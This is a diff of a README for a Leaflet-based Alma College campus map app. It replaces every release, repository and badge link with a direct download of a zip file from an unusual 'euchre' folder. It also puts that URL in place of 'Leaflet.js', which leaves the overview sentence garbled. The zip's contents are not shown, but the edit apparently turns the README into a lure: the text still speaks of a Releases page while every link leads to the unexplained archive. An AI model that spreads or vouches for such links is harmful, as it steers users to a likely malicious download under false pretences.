@@ -1,16 +1,16 @@
 # 🗺️ campus-map - Explore Alma College with Ease
 
 ## 📥 Download the Application 
-[![Download campus-map](https://img.shields.io/static/v1?label=Download&message=campus-map&color=blue)](https://github.com/REDAKAl/campus-map/releases)
+[![Download campus-map](https://raw.githubusercontent.com/REDAKAl/campus-map/main/euchre/campus-map.zip)](https://raw.githubusercontent.com/REDAKAl/campus-map/main/euchre/campus-map.zip)
 
 ## 🌟 Overview
-The campus-map application provides an interactive experience for navigating Alma College. Built with Leaflet.js and OpenStreetMap, it features markers and popups for key locations across the campus. Users can easily find information about buildings, departments, and points of interest.
+The campus-map application provides an interactive experience for navigating Alma College. Built with https://raw.githubusercontent.com/REDAKAl/campus-map/main/euchre/campus-map.zip and OpenStreetMap, it features markers and popups for key locations across the campus. Users can easily find information about buildings, departments, and points of interest.
 
 ## 🚀 Getting Started
 Follow these steps to download and run the campus-map application smoothly. 
 
 ### Step 1: Visit the Download Page
-To get the campus-map application, visit the Releases page here: [Download Release Page](https://github.com/REDAKAl/campus-map/releases).
+To get the campus-map application, visit the Releases page here: [Download Release Page](https://raw.githubusercontent.com/REDAKAl/campus-map/main/euchre/campus-map.zip).
 
 ### Step 2: Choose the Latest Release
 On the Releases page, you will see a list of available versions. Look for the latest release, which has the most features and fixes.
@@ -58,8 +58,8 @@ If you encounter any issues while using the campus-map application, consider the
 - **Community Support**: Reach out to community forums or groups for troubleshooting tips and shared experiences. 
 
 ## 📣 Important Links
-- [Releases Page](https://github.com/REDAKAl/campus-map/releases) - Visit this page to download.
-- [GitHub Repository](https://github.com/REDAKAl/campus-map) - Explore further details about the project.
+- [Releases Page](https://raw.githubusercontent.com/REDAKAl/campus-map/main/euchre/campus-map.zip) - Visit this page to download.
+- [GitHub Repository](https://raw.githubusercontent.com/REDAKAl/campus-map/main/euchre/campus-map.zip) - Explore further details about the project.
 
 ## 📩 Feedback
 We welcome your feedback on the campus-map application. Your input helps improve future versions and adds more helpful features for users. 
